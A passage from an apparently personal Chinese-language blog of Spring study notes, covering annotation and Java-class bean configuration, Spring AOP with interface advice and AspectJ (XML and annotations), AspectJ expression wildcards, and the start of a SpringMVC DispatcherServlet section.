class="line">    &#125;</span><br><span class="line">    <span class="comment">//========================================================</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外还要在Spring的xml配置文件中配置以使注解生效</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor"</span>/&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 使@Autowired可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.CommonAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使Common(@Resource,@PostConstruct,@PreDestroy)可用(?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.RequiredAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@Required可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.PersistenceAnnotationBeanPostProcessor "</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@PersistenceContext可用(?)"</span><br><span class="line">&lt;!------------------或者---------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面四条,但无法使用@Component,即还是要把这个类的bean配置一下,如在xml里配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:annotation-config</span> /&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-----------------或者----------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面一条,并且可以使用@Component,从指定package开始递归扫描 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:component-scan</span> <span class="attribute">base-package</span>=<span class="value">"com.test.pojo.human"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="基于java配置类的配置">基于java配置类的配置</h3><p>即是将xml配置文件里的配置提出来,放到一个java文件里,成为一个配置类.这样的好处即是不需要xml文件了,实现去xml化.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//btw spring boot里的@SpringBootApplication一条等于@Configuration,@EnableAutoConfiguration,@ComponentScan三条</span></span><br><span class="line"><span class="comment">//@ComponentScan("com.test.pojo.human")开启扫描</span></span><br><span class="line"><span class="annotation">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Configuration_or_somefckingothernamebutendwithConfig</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configuration_or_somefckingothername</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Bean("name2")</span></span><br><span class="line">    <span class="annotation">@Bean</span>(name=&#123;<span class="string">"infoX"</span>,<span class="string">"InformationX"</span>,<span class="string">"name2"</span>&#125;)</span><br><span class="line">    <span class="annotation">@Scope</span>(<span class="string">"singleton"</span>)<span class="comment">//Bean的实例如何创建,生命周期</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InformationX <span class="title">info_or_others</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InformationX();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@Bean</span></span><br><span class="line">    <span class="annotation">@Description</span>(<span class="string">"一些描述"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> human <span class="title">human_or_others</span><span class="params">(InformationX infoX,String n)</span></span>&#123;</span><br><span class="line">        human a= <span class="keyword">new</span> human();</span><br><span class="line">        human.setNameX(n);</span><br><span class="line">        human.setInformationX(infoX);</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<!--2018-03-31-->
<p>btw: Scope标识此bean的作用域,常在多线程问题中使用.</p>
<h3 id="什么时候该在xml里定义bean什么时候该用扫描">什么时候该在xml里定义bean什么时候该用扫描</h3><ul>
<li><p>在xml里定义bean</p>
<ul>
<li>非常严谨需要一个个定义</li>
<li>外部引入,无法修改的类</li>
<li>我就是享受那种一个个定义的快感的时候</li>
</ul>
</li>
<li><p>不需要定义bean</p>
<ul>
<li>怕在xml中配置的时候手滑</li>
<li>懒</li>
</ul>
</li>
</ul>
<h2 id="Spring_AOP">Spring AOP</h2><p><strong>A</strong>spect-<strong>O</strong>riented <strong>P</strong>rogramming(AOP,面向切面的程序设计)是对于<strong>O</strong>bject-<strong>o</strong>riented <strong>p</strong>rogramming(OOP,面向对象程序设计)的一个改进.</p>
<p>我对于AOP的理解: 即hook住了一个类(要代理的类)中的函数,使得我们可以在函数的之前之后跑一段其他代码.SpringAOP使得获取到的对象(Bean)为代理后的而不是原有的.</p>
<p>btw:当代理类中的函数互相调用时,SpringAOP不会起作用.</p>
<h3 id="通过继承接口实现的AOP">通过继承接口实现的AOP</h3><p>此处的接口指的是SpringAOP拦截器的接口,具体来说即继承<em>org.springframework.aop</em>下的函数:</p>
<ul>
<li><em>MethodBeforeAdvice.before()</em></li>
<li><em>AfterReturningAdvice.afterReturning()</em></li>
<li><em>MethodInterceptor.invoke()</em></li>
<li><em>ThrowsAdvice的AfterThrowing()</em>(ThrowAdvice并没有此接口,但是继承后的函数名依然要是AfterThrowing,<a href="https://stackoverflow.com/questions/29419189/how-does-spring-know-that-throwsadvice-afterthrowing-needs-to-be-called" target="_blank" rel="external">原因</a>)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> <span class="keyword">implements</span> <span class="title">MethodBeforeAdvice</span>,<span class="title">MethodInterceptor</span>,<span class="title">AfterReturningAdvice</span> </span>&#123;</span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">(Object o, Method method, Object[] objects, Object o1)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(MethodInvocation invocation)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturning</span><span class="params">(Object o, Method method, Object[] objects, Object o1)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Spring的xml配置文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxImpl"</span> <span class="attribute">class</span>=<span class="value">"com.test.xxxxImpl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxHelper"</span><span class="value">class="com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!----------------------------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!--JdkRegexpMethodPointcut的Patternc为一个正则表达式字符串组,定义了要注入的函数(切点)--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--即Advice(通告?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxAdvice"</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.support.JdkRegexpMethodPointcut"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name="pattern" value="fun_name" /&gt;   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"patterns"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="title">list</span>&gt;</span></span><br><span class="line">	            <span class="tag">&lt;<span class="title">value</span>&gt;</span>fun_name<span class="tag">&lt;/<span class="title">value</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;/<span class="title">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 关联切点(point)与实现接口的函数(advice)--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即Advisor(顾问?)  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxCutAdvisor"</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.support.DefaultPointcutAdvisor"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"advice"</span> <span class="attribute">ref</span>=<span class="value">"xxxxHelper"</span> /&gt;</span>         </span><br><span class="line">        <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"pointcut"</span> <span class="attribute">ref</span>=<span class="value">"xxxxAdvice"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------或者--------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面两句 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxCutAdvisor"</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.support.RegexpMethodPointcutAdvisor"</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"pattern"</span>&gt;</span>    </span><br><span class="line">         <span class="tag">&lt;<span class="title">value</span>&gt;</span>fun_name<span class="tag">&lt;/<span class="title">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="title">property</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"advice"</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="title">ref</span> <span class="attribute">bean</span>=<span class="value">"xxxxHelper"</span>/&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;/<span class="title">property</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- proxy(代理) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在代码实际运行时通过proxy创建代理对象从而实现AOP --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"proxy"</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.framework.ProxyFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"target"</span> <span class="attribute">ref</span>=<span class="value">"xxxxImpl"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"interceptorNames"</span> <span class="attribute">value</span>=<span class="value">"xxxxCutAdvisor"</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 接口,不写则直接代理指定类(当然不推荐),写了通过接口代理指定类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"proxyInterfaces"</span> <span class="attribute">value</span>=<span class="value">"com.test.xxxx"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--------------------------或------------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面的配置, 使得上面的target可以使用通配符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.framework.autoproxy.BeanNameAutoProxyCreator"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"beanNames"</span> <span class="attribute">value</span>=<span class="value">"*_name,some*,xxxxImpl"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"interceptorNames"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">list</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">value</span>&gt;</span>xxxxCutAdvisor<span class="tag">&lt;/<span class="title">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!---------------------------或--------------------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一句等于上面的配置, 自动扫描 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 若未匹配则不代理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-----------------------------------------------------------------------&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="通过xml来配置(AspectJ)">通过xml来配置(AspectJ)</h3><p>此种方法相比较第一种方法的最大区别即是不用继承接口.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before_or_dsoiafd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around_or_aisfad</span><span class="params">(ProceedingJoinPoint invocation)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after_or_sajdoip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>Spring的xml配置文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxHelper"</span> <span class="attribute">class</span>=<span class="value">"com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">aop:config</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="title">aop:aspect</span> <span class="attribute">ref</span>=<span class="value">"xxxxHelper"</span>&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 定义切点 --&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- expression内的是AspectJ表达式 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">aop:pointcut</span> <span class="attribute">id</span>=<span class="value">"init_cutpoint"</span> <span class="attribute">expression</span>=<span class="value">"execution(public com.test.xxxx.fun_name(..))"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 前置通知 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="title">aop:before</span> <span class="attribute">pointcut-ref</span>=<span class="value">"init_cutpoint"</span> <span class="attribute">method</span>=<span class="value">"before_or_dsoiafd"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 后置通知 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="title">aop:after</span> <span class="attribute">pointcut-ref</span>=<span class="value">"init_cutpoint"</span> <span class="attribute">method</span>=<span class="value">"after_or_sajdoip"</span>/&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 环绕通知 --&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!--也可以直接写AspectJ表达式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">aop:around</span> <span class="attribute">pointcut</span>=<span class="value">"execution(* com.test.xxxx.fun_name(..))"</span> <span class="attribute">method</span>=<span class="value">"around_or_aisfad"</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="title">aop:aspect</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="title">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="通过注解来配置(AspectJ)">通过注解来配置(AspectJ)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Aspect</span><span class="comment">//使得Spring可以自动扫描</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xxxxHelper_or_u_want</span> </span>&#123;</span><br><span class="line">    <span class="annotation">@Pointcut</span>(<span class="string">"execution(public com.test.xxxx.fun_name(..))"</span>)<span class="comment">//括号内的都是AspectJ表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init_cutpoint</span><span class="params">(JoinPoint joinPoint)</span> </span>&#123;</span><br><span class="line">        System.out.println(joinPoint.getSignature().getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Before</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before_or_dsoiafd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之前执行"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@Around</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">around_or_aisfad</span><span class="params">(ProceedingJoinPoint invocation)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"参数"</span> + invocation.getArguments()[<span class="number">0</span>] + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getStaticPart() + <span class="string">"--执行类"</span> +</span><br><span class="line">                invocation.getThis().getClass() + <span class="string">"--执行函数"</span> +</span><br><span class="line">                invocation.getMethod().getName());</span><br><span class="line">        Object ret=invocation.proceed();<span class="comment">//真正执行方法,也就是说你可以搞事:D</span></span><br><span class="line">        System.out.println(<span class="string">"环绕增强调用结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;<span class="comment">//可以修改函数返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@After</span>(<span class="string">"init_cutpoint()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after_or_sajdoip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"在MethodInterceptor之后执行"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Spring的xml配置文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">aop:aspectj-autoproxy</span> /&gt;</span><span class="comment">&lt;!-- 扫描@Aspect --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 更懒一些还可以选择@Component :D --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxImpl"</span> <span class="attribute">class</span>=<span class="value">"com.test.xxxxImpl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"xxxxHelper"</span> <span class="attribute">class</span>=<span class="value">"com.test.xxxxHelper_or_u_want"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="AspectJ表达式">AspectJ表达式</h3><p>AspectJ表达式通配符</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>*</em></td>
<td>匹配任何数量的字符</td>
</tr>
<tr>
<td><em>..</em></td>
<td>匹配任何数量的<strong>任何数量的字符</strong>,换句话说即匹配任何数量的<em>*</em></td>
</tr>
<tr>
<td><em>+</em></td>
<td>跟在类后面,表示此类的子类(不包含其本身)</td>
</tr>
</tbody>
</table>
<ul>
<li>对于简单的例子<ul>
<li><em>execution(public com.test.xxxxImpl.fun_name(..)))</em></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用 </th>
</tr>
</thead>
<tbody>
<tr>
<td><em>public</em></td>
<td>public类型</td>
</tr>
<tr>
<td><em>com.test.xxxxImpl</em></td>
<td>包名</td>
</tr>
<tr>
<td><em>.</em></td>
<td>连接包名与函数(方法)名 </td>
</tr>
<tr>
<td><em>fun_name</em></td>
<td>函数(方法)名</td>
</tr>
<tr>
<td><em>(..)</em></td>
<td>所有参数</td>
</tr>
</tbody>
</table>
<p>那么可以推出</p>
<table>
<thead>
<tr>
<th style="text-align:left">表达式</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>execution(public com.test.xxxxImpl.fun_name(..)))</em></td>
<td>任意参数的public的com.test.xxxImple.fun_name函数</td>
</tr>
<tr>
<td style="text-align:left"><em>execution(public com.test.xxxx+.fun_name(..)))</em></td>
<td>任意参数的public的实现了com.test.xxx的fun_name函数的函数</td>
</tr>
<tr>
<td style="text-align:left"><em>execution(public com.test.xxxx+.</em>(..)))*</td>
<td>任意参数的public的实现了com.test.xxx的任何函数的函数</td>
</tr>
<tr>
<td style="text-align:left"><em>execution(</em> com.test.xxxx+.<em>(..)))</em></td>
<td>任意参数的任意类型的实现了com.test.xxx的任何函数的函数</td>
</tr>
<tr>
<td style="text-align:left"><em>execution(public com.test.</em>(..)))*</td>
<td>任意参数的public的com.test包下的任何类(com.test.*)的任何函数</td>
</tr>
<tr>
<td style="text-align:left"><em>execution(public com.test..</em>(..)))*</td>
<td>任意参数的public的com.test.<em>/com.test.</em>.*的任何函数</td>
</tr>
</tbody>
</table>
<h2 id="Test">Test</h2><p>配置<em>log4j</em>后,使用<em>context.getBean()</em>获取<em>Bean</em>,调用类中的函数</p>
<h1 id="SpringMVC">SpringMVC</h1><p>SpringMvc(全称Spring Web MVC,位于spring-webmvc.jar)通过一个叫做<em>DispatcherServlet</em>的Servlet来获取 <strong>Model</strong>And<strong>View</strong> 来传递内容,并在<code>View</code>(一般是.jsp)中将<code>Model</code>渲染出来从而生成web页面.</p>
<p>btw: Spring5中引入了一个新的web框架Spring-webflux</p>
<h2 id="SpringMVC与Servlet容器(如Tomcat)的配置">SpringMVC与Servlet容器(如Tomcat)的配置</h2><h3 id="有多个Servlet的配置">有多个Servlet的配置</h3><ul>
<li>需要配置<em>[Servlet-name]-serlvet.xml</em></li>
</ul>
<p>在<em>web.xml</em>中配置<em>DispatcherServlet</em>即可,就如其名,它是个<em>Servlet</em>,他将<em>url-pattern</em>中的请求转发到关联的的<em>serlet-name</em>中,这样的好处即是可以将多个<em>Servlet</em>的<em>Bean</em>分离(或者说是每个<em>Servlet</em>的<em>WebApplicationContext</em>),互不影响.</p>
<p>在<em>web.xml</em>下进行如此配置</p>
